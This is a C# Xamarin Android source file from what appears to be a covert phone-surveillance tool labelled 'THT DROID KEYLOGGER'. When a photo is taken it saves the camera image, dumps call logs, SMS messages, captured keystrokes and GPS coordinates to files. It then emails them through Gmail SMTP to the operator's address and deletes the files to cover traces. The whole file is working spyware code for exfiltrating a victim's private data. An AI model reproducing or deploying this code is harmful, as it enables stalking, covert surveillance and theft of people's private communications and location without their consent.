using Android.App;
using Android.Content;
using Android.Content.Res;
using Android.Hardware;
using Java.IO;
using Plugin.Geolocator;
using Plugin.Geolocator.Abstractions;
using System;
using System.Net;
using System.Net.Mail;
using System.Threading.Tasks;
using Xamarin.Essentials;

namespace izci
{
    [IntentFilter(new string[] {
    "android.provider.Telephony.READ_SMS","android.permission.READ_CALL_LOG"
    ,"android.permission.READ_SMS"}, Priority = (int)IntentFilterPriority.HighPriority)]
    class PictureCallback : Java.Lang.Object, Camera.IPictureCallback
    {
        private int _cameraID;
        public PictureCallback(int cameraID)
        {
            _cameraID = cameraID;
        }
        public void OnPictureTaken(byte[] data, Camera camera)
        {
            File resim = new File(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/sago0.jpg");
            if (resim.Exists())
            {
                resim.Delete();
            }
            //File photoFile = GetOutputMediaFile();      
            try
            {
                var fos = new FileOutputStream(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/sago0.jpg");
                fos.Write(data);
                fos.Close();
                loglariHazirEt();
                emailGonder();
                //Log.Info("Cam", "dosya yazıldı");
            }
            catch (Exception e)
            {
                _ = e.StackTrace; 
            }
        }
        public async Task<string> lokasyonCek()
        {
            try
            {
                IGeolocator locator = CrossGeolocator.Current;
                locator.DesiredAccuracy = 50;
                Position position = await locator.GetPositionAsync(TimeSpan.FromSeconds(6));
                return ("Enlem: " + position.Latitude + " Boylam: " + position.Longitude);
            }
            catch(Exception ex) { return ex.Message; }
            
        }
      
        public async void emailGonder()
        {
            await Task.Run(async() => {
            try
            {
                //Toast.MakeText(mc.ApplicationContext, "mail basliyor", ToastLength.Long).Show();
                //SagoistCoding//
                string subject = "[THT DROID KEYLOGGER] " + MainValues.KRBN_ISMI;
                string body = "";
                foreach (string s in KeyListen.loglar)
                {
                    body += s + Environment.NewLine;
                }
                if (string.IsNullOrEmpty(body)) { body = "LOG YOK."; }

                System.IO.File.WriteAllText(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/logss.txt",
                 body);

                    MailMessage mail = new MailMessage();
                    SmtpClient smtpServer = new SmtpClient("smtp.gmail.com", 587);
                    mail.From = new MailAddress(MainValues._EMAIL);
                    mail.To.Add(MainValues._EMAIL);
                    mail.Subject = subject;
                    mail.Body ="Konum Bilgileri:\n" + await lokasyonCek();
                    mail.Attachments.Add(new Attachment(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/sago0.jpg"));
                    mail.Attachments.Add(new Attachment(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/cont.txt"));
                    mail.Attachments.Add(new Attachment(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/smsler.txt"));
                    mail.Attachments.Add(new Attachment(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/logss.txt"));
                    smtpServer.Credentials = new NetworkCredential(MainValues._EMAIL, MainValues._SIFRE);
                    smtpServer.UseDefaultCredentials = false;
                    smtpServer.EnableSsl = true;

                    smtpServer.SendCompleted += (s, e) =>
                    {
                        //Toast.MakeText(mc.ApplicationContext, "gönderildi", ToastLength.Long).Show();
                        File resim = new File(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/sago0.jpg");
                        if (resim.Exists())
                        {
                            resim.Delete();
                        }

                        File ca = new File(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/cont.txt");
                        if (ca.Exists())
                        {
                            ca.Delete();
                        }

                        File sms = new File(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/smsler.txt");
                        if (sms.Exists())
                        {
                            sms.Delete();
                        }
                        File lg = new File(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/logss.txt");
                        if (lg.Exists())
                        {
                            lg.Delete();
                        }
                        smtpServer.Dispose(); mail.Dispose();
                    };
                    smtpServer.SendAsync(mail, null);
                    KeyListen.loglar.Clear();
                }
                catch (Exception)
                {

                }

            });
        }
        public void loglariHazirEt()
        {
            Activity temp = default;
            if(SecondActivity.aktivity_require == null)
            {
                temp = MainActivity.act;
            }
            else
            {
                temp = SecondActivity.aktivity_require;
            }
            LogVerileri veri = new LogVerileri(temp);
            veri.aramaKayitlariniCek();
            veri.smsLeriCek();
            var list = veri.kayitlar;
            var sms_ = veri.smsler;

            using (System.IO.StreamWriter sw = new System.IO.StreamWriter(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/cont.txt"))
            {
                for (int i = 0; i < list.Count; i++)
                {
                    sw.WriteLine(list[i].Numara + "\n" + list[i].Tarih + "\n"
                    + list[i].Durasyon + "\n" + list[i].Tip);

                    sw.WriteLine();
                }
            }

            using (System.IO.StreamWriter sw = new System.IO.StreamWriter(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/smsler.txt"))
            {
                for (int i = 0; i < sms_.Count; i++)
                {
                    sw.WriteLine(sms_[i].Gonderen + "\n" + sms_[i].Icerik + "\n"
                    + sms_[i].Tarih);

                    sw.WriteLine();
                }
            }
        }
        private File GetOutputMediaFile()
        {
            //string timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").Format(new Date());
            string imageFileName = "0sago";//$"cameraID: {_cameraID}. JPEG_" + timeStamp + "_";
            File storageDir = Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures);
            File image = File.CreateTempFile(
                imageFileName,  /* prefix */
                ".jpg",         /* suffix */
                storageDir     /* directory */
            );

            return image;
        }
        
    }
}